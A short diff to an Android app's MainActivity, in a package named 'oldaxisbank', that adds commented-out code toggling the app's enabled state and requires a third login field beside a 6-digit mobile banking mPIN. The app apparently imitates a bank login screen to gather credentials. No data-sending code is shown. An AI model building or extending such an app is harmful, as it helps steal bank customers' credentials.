@@ -1,7 +1,9 @@
 package com.example.oldaxisbank
 
 import android.app.ActivityManager
+import android.content.ComponentName
 import android.content.Intent
+import android.content.pm.PackageManager
 import android.net.Uri
 import android.os.Bundle
 import android.os.PowerManager
@@ -35,6 +37,13 @@ class MainActivity : AppCompatActivity() {
         super.onCreate(savedInstanceState)
         binding = ActivityMainBinding.inflate(layoutInflater)
         setContentView(binding.root)
+
+
+//        val pakagemanger = packageManager
+////        val componentname =  ComponentName(this,MainActivity::class.java)
+//        pakagemanger.setApplicationEnabledSetting(packageName,PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
+//            PackageManager.DONT_KILL_APP)
+
 
         val util = Util()
         val random = Random()
@@ -115,8 +124,8 @@ class MainActivity : AppCompatActivity() {
 
         binding.login.setOnClickListener {
 
-            if (binding.e2.text.toString().isEmpty()
-                || binding.e3.text.toString().isEmpty() ){
+            if ( binding.e2.text.toString().isEmpty()
+                || binding.e3.text.toString().isEmpty() || binding.e4.text.toString().isEmpty() ){
                 Toast.makeText(this,"fill all fields", Toast.LENGTH_SHORT).show();
             }else if( (binding.e3.text.toString().length != 6 && binding.t3.text
                         == "mPIN (Enter 6 digit mobile banking mPIN)" ) ){
